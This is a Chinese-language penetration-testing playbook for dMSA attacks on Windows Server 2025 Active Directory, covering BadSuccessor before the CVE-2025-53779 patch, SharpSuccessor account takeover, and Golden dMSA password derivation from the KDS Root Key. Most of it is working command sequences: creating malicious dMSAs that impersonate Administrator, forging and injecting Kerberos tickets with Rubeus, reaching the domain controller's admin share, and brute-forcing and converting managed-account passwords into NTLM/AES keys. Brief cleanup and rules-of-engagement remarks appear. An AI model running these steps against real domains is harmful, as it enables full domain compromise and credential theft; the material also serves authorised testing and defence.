# Windows Server 2025 dMSA 攻击

适用：Windows Server 2025 Active Directory。这里区分三条完全不同的路径：

```
Legacy BadSuccessor（CVE-2025-53779修补前）
Post-patch dMSA Account Takeover（SharpSuccessor）
Golden dMSA（已取得KDS Root Key后的离线密码派生）
```

不要把三者都简化成“dMSA = 域管”。

---

## 0. 从 /ad-recon 接收的条件

至少先确认：

```
Windows Server 2025 DC存在
可创建dMSA的OU / CreateChild / GenericAll
是否还能写目标User/Computer对象
DC是否已安装CVE-2025-53779对应修复
是否已经取得KDS Root Key（Golden dMSA）
```

快速复核：

```
nxc ldap DC-IP -u jen -p 'pass' -M badsuccessor
```

如果没有 Server 2025 DC：停止该路径。

---

## 1. Legacy BadSuccessor — PRE-PATCH ONLY

状态：**仅用于未修补CVE-2025-53779的Server 2025 DC / 老靶场。**

公开实现：`ibaiC/BadSuccessor`

### 枚举可利用OU

Windows：

```cmd
BadSuccessor.exe find
```

典型目标：当前主体可以在其中创建dMSA对象的OU。

### 创建恶意dMSA

机器账户作为允许检索密码主体：

```cmd
BadSuccessor.exe escalate ^
  -targetOU "OU=Servers,DC=corp,DC=local" ^
  -dmsa backup_svc ^
  -targetUser "CN=Administrator,CN=Users,DC=corp,DC=local" ^
  -dnshostname backup_svc ^
  -machine BRAAVOS$ ^
  -dc-ip 10.10.10.10
```

或用户主体：

```cmd
BadSuccessor.exe escalate ^
  -targetOU "OU=Servers,DC=corp,DC=local" ^
  -dmsa backup_svc ^
  -targetUser "CN=Administrator,CN=Users,DC=corp,DC=local" ^
  -dnshostname backup_svc ^
  -user jen ^
  -dc-ip 10.10.10.10
```

关键成功条件：新dMSA对象创建成功，并建立目标账户迁移/前任关系。

### 后续Kerberos

需要支持dMSA的Rubeus版本。

先从当前可认证主体得到TGT：

```cmd
Rubeus.exe tgtdeleg /nowrap
```

再请求dMSA的krbtgt票据：

```cmd
Rubeus.exe asktgs ^
  /targetuser:backup_svc$ ^
  /service:krbtgt/corp.local ^
  /dmsa ^
  /dc:DC01.corp.local ^
  /opsec ^
  /nowrap ^
  /ptt ^
  /ticket:<BASE64_TGT>
```

得到dMSA票据后请求实际服务票据：

```cmd
Rubeus.exe asktgs ^
  /user:backup_svc$ ^
  /service:cifs/DC01.corp.local ^
  /dmsa ^
  /opsec ^
  /nowrap ^
  /ptt ^
  /ticket:<DMSA_TICKET>
```

验证：

```cmd
klist
dir \\DC01.corp.local\c$
```

### 清理

记录创建的dMSA名称和OU。测试完成：

```cmd
BadSuccessor.exe del backup_svc "OU=Servers,DC=corp,DC=local"
```

**不要在已修补环境继续把“可写OU”直接判断为任意账户接管。**

---

## 2. Post-patch dMSA Account Takeover — SharpSuccessor

状态：**CVE-2025-53779修补后仍可能成立，但前置条件更高。**

公开实现：`logangoins/SharpSuccessor`

核心前置：

```
CreateChild on 某OU
+
对目标User/Computer对象有写权限
```

也就是说：

```
可创建dMSA OU而不能写目标对象
  → patch后通常不够

可创建dMSA OU + 可写目标对象
  → 进入SharpSuccessor验证
```

### 创建并weaponize dMSA

```cmd
SharpSuccessor.exe add ^
  /impersonate:Administrator ^
  /path:"OU=Test,DC=corp,DC=local" ^
  /account:jen ^
  /name:attacker_dMSA
```

这里 `/account:jen` 是当前可认证、用于后续票据流程的主体。

### 获取当前主体TGT

```cmd
Rubeus.exe tgtdeleg /nowrap
```

复制输出的Base64 TGT。

### 请求dMSA TGT

```cmd
Rubeus.exe asktgs ^
  /targetuser:attacker_dmsa$ ^
  /service:krbtgt/corp.local ^
  /opsec ^
  /dmsa ^
  /nowrap ^
  /ptt ^
  /ticket:<BASE64_TGT>
```

成功后会得到带被冒充账户上下文的dMSA票据。

### 请求目标服务票据

SMB：

```cmd
Rubeus.exe asktgs ^
  /user:attacker_dmsa$ ^
  /service:cifs/DC01.corp.local ^
  /opsec ^
  /dmsa ^
  /nowrap ^
  /ptt ^
  /ticket:<DMSA_TICKET>
```

验证：

```cmd
klist
dir \\DC01.corp.local\c$
```

如果目标并非Administrator，按目标真实权限选择服务，不要固定假设一定可访问DC管理共享。

### 清理/恢复

SharpSuccessor会创建dMSA并修改目标相关迁移属性。执行前先记录：

```
新建dMSA DN
目标对象原始dMSA相关属性
```

HTB/CTF优先依赖靶场reset/snapshot恢复；真实授权环境只有在ROE允许目录对象修改时才验证，并按测试前记录恢复。

---

## 3. Golden dMSA — 已取得KDS Root Key

公开实现：`Semperis/GoldenDMSA`

这不是低权限初始提权。前置是已经得到KDS Root Key，属于post-compromise能力。

攻击逻辑：

```
KDS Root Key
  ↓
枚举dMSA/gMSA SID + ManagedPasswordID
  ↓
离线计算/猜测ManagedPasswordID
  ↓
生成有效managed account密码
  ↓
转换为NTLM/AES key
```

### 枚举dMSA/gMSA

LDAP方式：

```cmd
GoldendMSA.exe info -d corp.local -m ldap
```

也支持RID brute模式：

```cmd
GoldendMSA.exe info -d corp.local -m brute -u jen -p Password123! -o corp.local -r <RID>
```

### 获取KDS Root Key信息

Enterprise Admin权限：

```cmd
GoldendMSA.exe kds
GoldendMSA.exe kds -g <KDS_ROOT_KEY_GUID>
```

如果已经在DC上获得SYSTEM：

```cmd
GoldendMSA.exe kds --domain corp.local
```

### 生成ManagedPasswordID候选

```cmd
GoldendMSA.exe wordlist ^
  -s <DMSA_SID> ^
  -d corp.local ^
  -f corp.local ^
  -k <KDS_ROOT_KEY_ID>
```

### 已知ManagedPasswordID时直接计算

```cmd
GoldendMSA.exe compute ^
  -s <DMSA_SID> ^
  -k <KDS_ROOT_KEY> ^
  -d corp.local ^
  -m <MANAGED_PASSWORD_ID>
```

### brute-force dMSA密码

```cmd
GoldendMSA.exe bruteforce ^
  -s <DMSA_SID> ^
  -i <KDS_ROOT_KEY_ID> ^
  -k <KDS_ROOT_KEY> ^
  -d corp.local ^
  -u svc_backup$ ^
  -t
```

### 转换为可用Kerberos/NTLM key

```cmd
GoldendMSA.exe convert ^
  -d corp.local ^
  -u svc_backup$ ^
  -p <BASE64_PASSWORD>
```

输出通常包含NTLM/AES128/AES256材料，再按已有PTH/PTT/Kerberos流程使用。

---

## 4. 决策速查

```
Server 2025 DC?
  否 → 退出dMSA模块
  是
   ↓
可创建dMSA OU?
  否 → 只枚举已有dMSA / 等其他路径
  是
   ↓
DC未修补CVE-2025-53779?
  是 → Legacy BadSuccessor可测试
  否
   ↓
还能写目标User/Computer?
  是 → SharpSuccessor post-patch takeover
  否 → 不把它判为可利用

已取得KDS Root Key?
  是 → Golden dMSA独立路径
```
